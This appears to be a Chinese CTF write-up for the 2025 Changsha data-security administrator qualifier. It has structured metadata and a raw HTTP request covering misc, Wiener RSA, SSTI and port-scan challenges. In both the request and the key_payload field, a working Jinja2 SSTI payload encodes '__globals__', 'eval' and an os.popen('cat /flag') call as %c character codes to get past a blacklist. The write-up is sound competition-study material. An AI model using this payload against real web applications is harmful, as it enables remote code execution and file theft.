---
title: 长沙市2025年"十行状元百优工匠"预选赛-数据安全管理员赛项-WP
contest: 长沙市数据安全管理员预选赛
year: 2025
difficulty: medium
vuln_type: misc_unknown
tags:
- Misc-HexCode
- 服务器应急
- Wiener攻击RSA
- 基础Web-SSTI
- SSTI-8进制Unicode
- CTFNetA流量
attack_chain: 'HexCode: 7z附件解出二进制转图片|失控的服务器: 服务器异常行为分析|Crypto-Wiener: 连分数逼近e/φ(N)求d|Web-许愿池: SSTI %c*11 char编码绕__globals__|网站在哪里: 端口扫描'
key_payload: '{%print(((lipsum|attr((''%c''*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr((''%c''*11)%(95,95,103,101,116,105,116,101,109,95,95))((''%c''*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr((''%c''*11)%(95,95,103,101,116,105,116,101,109,95,95))((''%c''*4)%(101,118,97,108))))((''%c''*42)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,39,41,46,114,101,97,100,40,41)))|Wiener: d = convergents(e/N) 找w满足|attachment=7z解|attachment=server.txt'
one_liner: 长沙市2025预选赛数据安全管理员赛项:HexCode(7z解+二进制转图)+失控的服务器(应急分析)+Wiener攻击RSA(连分数逼近e/φ(N))+SSTI %c*11 char编码__globals__+网站查端口
lesson: 1) SSTI %c*11 char编码:'(''%c''*11)%(95,95,103,108,111,98,97,108,115,95,95)'='__globals__',用chr(95)='_'+95=chr拼接; 2) Wiener攻击RSA:e/φ(N)连分数收敛找w使e*w≡1 mod (p-1)(q-1); 3) 二进制转图:7z解+Python PIL按byte写像素; 4) 服务器失控:从进程/网络/文件三方面分析
quality: medium
full_path: 长沙市2025年“十行状元百优工匠”预选赛-数据安全管理员赛项-WP.full.md
meta_path: 长沙市2025年“十行状元百优工匠”预选赛-数据安全管理员赛项-WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 长沙市2025年"十行状元百优工匠"预选赛-数据安全管理员赛项-WP。长沙市2025预选赛数据安全管理员赛项:HexCode(7z解+二进制转图)+失控的服务器(应急分析)+Wiener攻击RSA(连分数逼近e/φ(N))+SSTI %c*11 char编码__globals__+网站查端口。经验：1) SSTI %c*11 char编码:'(''%c''*11)%(95,95,103,...
category: misc
subcategory: misc_other
tools_used:
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: industry
wp_url: https://www.ctfiot.com/271931.html
reasoning_chain:
- 附件 hex_code.7z → 触发点：二进制文件藏图
- 假设：7z 解后按 byte 写像素 → 动作：PIL Image.new + putdata
- 观察：得到 HexCode 图 → flag
- 失控的服务器 → 假设：进程/网络/文件三方面应急 → 动作：分析进程链 + netstat + 异常脚本
- Crypto Wiener → 触发点：e 偏大（接近 N） → 假设：连分数逼近 e/φ(N)
- 动作：SymPy continued_fraction(e/N) 收敛 → 观察：d 出
- Web 许愿池 → 触发点：模板渲染 → 假设：SSTI
- 假设：黑名单拦 __globals__ → 动作：('%c'*11)%(95,95,103,108,111,98,97,108,115,95,95)
- 观察：lipsum|attr(__globals__)|attr(getitem)(builtins)|attr(getitem)(eval)(...) → RCE
- 网站在哪里 → 假设：端口扫描 → 动作：nmap -p 1-65535
failed_attempts:
- 试图直接 hex dump 找 flag → 失败：图藏在二进制像素
- 试图用 Pollard rho 分解 N → 失败：e 大 N 标准 Wiener 适用
key_observations:
- 二进制→PIL 写像素是 HexCode 类题标配
- Wiener 攻击条件：e 大（接近 N），连分数收敛找 d
- ('%c'*N)%(…) 是 Jinja SSTI 绕字符黑名单通用模板
- 服务器失控题核心在 进程链 + 网络 + 文件 三维度排查
prerequisites:
- 7z 解压 + PIL 像素写入
- RSA Wiener 攻击（连分数）
- Jinja SSTI + %c 字符拼接
- nmap 端口扫描
---
# 长沙市2025年“十行状元百优工匠”预选赛-数据安全管理员赛项-WP

> 原文: https://www.ctfiot.com/271931.html
> ID: 271931

题目涉及附件请关注微信公众号”无尽信安”回复“数据安全管理员”下载

文章目录：

单选题

多选题

判断题

Misc

HexCode

失控的服务器

Crypto

Wiener

【没做出来】不一样的编码

Web

许愿池

网站在哪里，查端口

题目涉及附件请关注微信公众号”无尽信安”回复“数据安全管理员”下载


```
附件名：hex_code.7z
附件名：失控的服务器.txt
附件名：Wiener-crypto.json
附件名：不一样的编码.txt
POST/HTTP/1.1Host:
cs2025.cncstea.cn:
32181User-Agent:
Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:
142.0)Gecko/20100101Firefox/142.0Accept-Encoding:
gzip,deflateContent-Type:
application/jsonOrigin:
http://cs2025.cncstea.cn:
32181Priority:u=0Accept:*/*Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer:
http://cs2025.cncstea.cn:
32181/Content-Length:12{"name":"{%print(((lipsum|attr(('%c'*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr(('%c'*11)%(95,95,103,101,116,105,116,101,109,95,95))(('%c'*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(('%c'*11)%(95,95,103,101,116,105,116,101,109,95,95))(('%c'*4)%(101,118,97,108))))(('%c'*42)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,99,97,116,32,47,102,108,97,103,39,41,46,114,101,97,100,40,41)))%}"}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]